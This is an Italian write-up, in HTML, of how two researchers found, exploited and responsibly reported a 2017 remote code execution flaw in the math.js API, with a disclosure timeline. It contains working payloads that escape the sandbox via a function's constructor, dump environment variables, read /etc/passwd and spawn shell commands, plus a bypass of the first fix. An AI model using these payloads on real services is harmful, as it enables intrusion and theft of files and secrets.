<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="generator" content="pandoc">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
  <meta name="author" content="CapacitorSet">
  <title>How we exploited a remote execution vulnerability in math.js</title>
  <style type="text/css">code{white-space: pre;}</style>
  <style type="text/css">
    /* Source: https://bestmotherfucking.website (with changes) */
    body{
      margin: 1em auto;
      max-width: 40em;
      padding: 0 .62em;
      font: 1.2em/1.62 sans-serif;
    }
    p {
      text-align: justify;
    }
    h1, h2, h3 {
      line-height: 1.2;
    }
    blockquote {
      background-color: #eee;
      border-left: 6px solid silver;
      padding: 0.1em 1em 0.1em 1em;
    }
    pre, code {
      overflow: scroll
    }
    @media print {
      body {
        max-width:none
      }
    }
  </style>
</head>
<body>
<h1 id="come-abbiamo-exploitato-una-vulnerabilità-di-remote-code-execution-in-math.js">Come abbiamo exploitato una vulnerabilità di remote code execution in math.js</h1>
<p>Questo articolo spiega in breve come abbiamo trovato, exploitato e segnalato una vulnerabilità di remote code execution (RCE). È fatto per essere una guida su come trovare vulnerabilità, e come segnalarle in modo responsabile.</p>
<h2 id="prima-fase-scoperta">Prima fase: scoperta</h2>
<p>Sperimentando con <a href="https://github.com/LucentW/s-uzzbot/blob/master/plugins/calculator.lua">un wrapper</a> dell'API math.js (<code>http://api.mathjs.org/v1/?expr=expression-here</code>), abbiamo scoperto che <strong>sembra eseguire del codice JavaScript</strong>, anche se con alcune restrizioni:</p>
<pre><code>!calc cos
Result: function
!calc eval
Result: function
!calc eval(&quot;x =&gt; x&quot;)
Error: Value expected (char 3)
!calc eval(&quot;console.log&quot;)
Error: Undefined symbol console
!calc eval(&quot;return 1&quot;)
Result: 1</code></pre>
<p>In particolare, sembra che <code>eval</code> sia stato sostituito con una versione sicura. Neanche <code>Function</code> e <code>setTimeout</code> funzionano:</p>
<pre><code>!calc Function(&quot;return 1&quot;)
Error: Undefined symbol Function
!calc setTimeout
Error: Undefined symbol Function</code></pre>
<h2 id="seconda-fase-exploit">Seconda fase: exploit</h2>
<blockquote>
<p>Dopo aver capito che ci sono delle restrizioni sull'esecuzione del codice, abbiamo dovuto capire come aggirarle.</p>
</blockquote>
<p>In JavaScript ci sono quattro modi di <strong>eseguire delle stringhe</strong>:</p>
<ul>
<li><a href="https://developer.mozilla.org/it/docs/Web/JavaScript/Reference/Global_Objects/eval"><code>eval(&quot;codice&quot;)</code></a></li>
<li><a href="https://developer.mozilla.org/it/docs/Web/JavaScript/Reference/Global_Objects/Function"><code>new Function(&quot;codice&quot;)</code></a></li>
<li><a href="https://developer.mozilla.org/it/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout"><code>setTimeout(&quot;code&quot;, timeout)</code></a></li>
<li><a href="https://developer.mozilla.org/it/docs/Web/API/WindowOrWorkerGlobalScope/setInterval"><code>setInterval(&quot;code&quot;, interval)</code></a></li>
</ul>
<p>Nell'ambiente math.js, non possiamo accedere direttamente a queste funzioni, o perché non sono definite o perché sono state ridefinite perché siano sicure. Tuttavia, ci si può accedere indirettamente: in particolare, <strong>si puà accedere indirettamente a <code>Function</code> come construttore di una funzione esistente</strong> - questa è stata l'intuizione chiave che ha portato all'exploit.</p>
<blockquote>
<p>Per esempio, <code>Function(&quot;return 1&quot;)</code> può essere sostituito con <code>Math.floor.constructor(&quot;return 1&quot;)</code>. Perciò, per eseguire <code>return 1</code>, possiamo usare <code>Math.floor.constructor(&quot;return 1&quot;)()</code>.</p>
</blockquote>
<p>Sappiamo che in math.js <code>cos</code> è definito come una funzione, per cui l'abbiamo usata:</p>
<pre><code>!calc cos.constructor(&quot;return 1&quot;)()
Result: 1</code></pre>
<p>Funziona!</p>
<p>Da qua avremmo potuto semplicemente usare <code>require</code> con dei moduli nativi e avere accesso al sistema operativo, giusto? Purtroppo no: nonostante il server dell'API math.js giri in un ambiente Node.js, per qualche motivo non possiamo usare <code>require</code>.</p>
<pre><code>!calc cos.constructor(&quot;return require&quot;)()
Error: require is not defined</code></pre>
<p>Tuttavia abbiamo potuto usare <code>process</code>, che ha <a href="https://nodejs.org/api/process.html">diverse funzionalità carine</a>:</p>
<pre><code>!calc cos.constructor(&quot;return process&quot;)()
Result: [object process]
!calc cos.constructor(&quot;return process.env&quot;)()
Result: {&quot;WEB_MEMORY&quot;: &quot;512&quot;, &quot;MEMORY_AVAILABLE&quot;: &quot;512&quot;, &quot;NEW_RELIC_LOG&quot;: &quot;stdout&quot;, &quot;NEW_RELIC_LICENSE_KEY&quot;: &quot;&lt;censurato&gt;&quot;, &quot;DYNO&quot;: &quot;web.1&quot;, &quot;PAPERTRAIL_API_TOKEN&quot;: &quot;&lt;censurato&gt;&quot;, &quot;PATH&quot;: &quot;/app/.heroku/node/bin:/app/.heroku/yarn/bin:bin:node_modules/.bin:/usr/local/bin:/usr/bin:/bin:/app/bin:/app/node_modules/.bin&quot;, &quot;WEB_CONCURRENCY&quot;: &quot;1&quot;, &quot;PWD&quot;: &quot;/app&quot;, &quot;NODE_ENV&quot;: &quot;production&quot;, &quot;PS1&quot;: &quot;\[\033[01;34m\]\w\[\033[00m\] \[\033[01;32m\]$ \[\033[00m\]&quot;, &quot;SHLVL&quot;: &quot;1&quot;, &quot;HOME&quot;: &quot;/app&quot;, &quot;PORT&quot;: &quot;&lt;censurato&gt;&quot;, &quot;NODE_HOME&quot;: &quot;/app/.heroku/node&quot;, &quot;_&quot;: &quot;/app/.heroku/node/bin/node&quot;}</code></pre>
<p>Nonostante <code>process.env</code> contenga alcune informazioni interessanti, non possiamo usarlo per fare nulla di interessante: dobbiamo andare più in fondo e usare <a href="http://stackoverflow.com/q/24042861"><code>process.binding</code></a>, che esponde dei binding Javascript all'OS. Nonostante non siano presenti nella documentazione ufficiale, si può determinare il loro funzionamento leggendo il codice sorgente di Node.js. Ad esempio, possiamo usare <code>process.binding(&quot;fs&quot;)</code> per leggere qualsiasi file sul disco (se abbiamo i permessi necessari):</p>
<blockquote>
<p>Per brevità, salteremo il wrapper <code>!calc cos.constructor(&quot;code&quot;)</code>, e presenteremo solo il codice JS.</p>
</blockquote>
<pre><code>buffer = Buffer.allocUnsafe(8192); process.binding(&#39;fs&#39;).read(process.binding(&#39;fs&#39;).open(&#39;/etc/passwd&#39;, 0, 0600), buffer, 0, 4096); return buffer
Result: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
&lt;more users...&gt;</code></pre>
<p>Abbiamo quasi finito: dobbiamo solo capire come aprire una shell ed eseguire un qualsiasi comando. Chi ha esperienza con Node.js sarà a conoscenza di <a href="https://nodejs.org/api/child_process.html"><code>child_process</code></a>, che può essere usato per spawnare processi tramite <code>spawnSync</code>: dobbiamo solo re-implementare <code>child_process</code> usando i binding al SO (ricordiamo che non possiamo usare <code>require</code>).</p>
<p>È più facile di quanto sembri: basta prendere <a href="https://github.com/nodejs/node/blob/master/lib/child_process.js">il codice sorgente di <code>child_process</code></a>, rimuovere il codice che non ci serve (funzioni inutilizzate e gestione degli errori), minificarlo ed eseguirlo nell'API (<a href="https://gist.github.com/CapacitorSet/c41ab55a54437dcbcb4e62713a195822">qua il codice</a>). Una volta fatto questo, <strong>possiamo spawnare un qualsiasi processo</strong> ed eseguire comandi nella shell:</p>
<pre><code>return spawnSync(&#39;/usr/bin/whoami&#39;);
Result: {&quot;status&quot;: 0, &quot;signal&quot;: null, &quot;output&quot;: [null, u15104, ], &quot;pid&quot;: 100, &quot;stdout&quot;: u15104, &quot;stderr&quot;: }</code></pre>
<h2 id="fase-tre-segnalazione">Fase tre: segnalazione</h2>
<p>Dopo aver trovato una vulnerabilità e l'abbiamo sfruttata al massimo, abbiamo dovuto decidere cosa farci. Poiché l'abbiamo exploitata per divertimento e non abbiamo scopi criminali, abbiamo scelto di fare i &quot;white hat&quot; e di segnalarlo all'autore. L'abbiamo <strong>contattato in privato</strong> tramite l'indirizzo e-mail sul suo profilo GitHub con questi dettagli:</p>
<ul>
<li>una breve descrizione della vulnerabilità (una RCE in mathjs.eval);</li>
<li>un <strong>attacco di esempio</strong> con una spiegazione di come funzionasse (una spiegazione del perché <code>cos.constructor(&quot;code&quot;)()</code> funzionasse e di cosa si potesse fare con <code>process.bindings</code>);</li>
<li>una <strong>dimostrazione</strong> sul server live (abbiamo incluso l'output di <code>whoami</code> e <code>uname -a</code>);</li>
<li>suggerimenti su <strong>come sistemare la vulnerabilità</strong> (ad esempio, usando <a href="https://nodejs.org/api/vm.html">il modulo <code>vm</code> in Node.js</a>).</li>
</ul>
<p>Abbiamo lavorato con l'autore per due giorni per aiutarlo a sistemare la vulnerabilità. In particolare, dopo la fix inclusa in <a href="https://github.com/josdejong/mathjs/commit/2f456009056bc332673f45ca143d4d92c8c7b159"><code>2f45600</code></a> abbiamo trovato un altro modo di aggirarla (se non si può usare direttamente il costruttore, basta usare <code>cos.constructor.apply(null, &quot;code&quot;)()</code>) che è stato sistemato in <a href="https://github.com/josdejong/mathjs/commit/3c3517daa6412457826b79b60368d8e8e415a7dd"><code>3c3517d</code></a>.</p>
<h3 id="timeline">Timeline</h3>
<ul>
<li>26 Marzo 2017 22:20 CEST: primo exploit avvenuto con successo</li>
<li>29 Marzo 2017 14:43 CEST: la vulnerabilità è stata segnalata all'autore</li>
<li>31 Marzo 2017 12:35 CEST: la seconda vulnerabilità (<code>.apply</code>) è stata segnalata</li>
<li>31 Marzo 2017 13:52 CEST: sono state sistemate entrambe le vulnerabilità</li>
</ul>
<hr />
<blockquote>
<p>La vulnerabilità è stata scoperta da <a href="https://github.com/CapacitorSet">@CapacitorSet</a> e <a href="https://github.com/denysvitali">@denysvitali</a>. Ringraziamo <a href="https://github.com/josdejong/">@josdejong</a> per aver fixato la vulnerabilità con prontezza, e <a href="http://www.jsfuck.com/">JSFuck</a> per aver scoperto il trucco di usare <code>[].filter.constructor</code>.</p>
<p><small>Rilasciato sotto la licenza <a href="https://creativecommons.org/licenses/by/4.0/"><strong>CC-BY 4.0</strong></a>.</p>
</blockquote>
</body>
</html>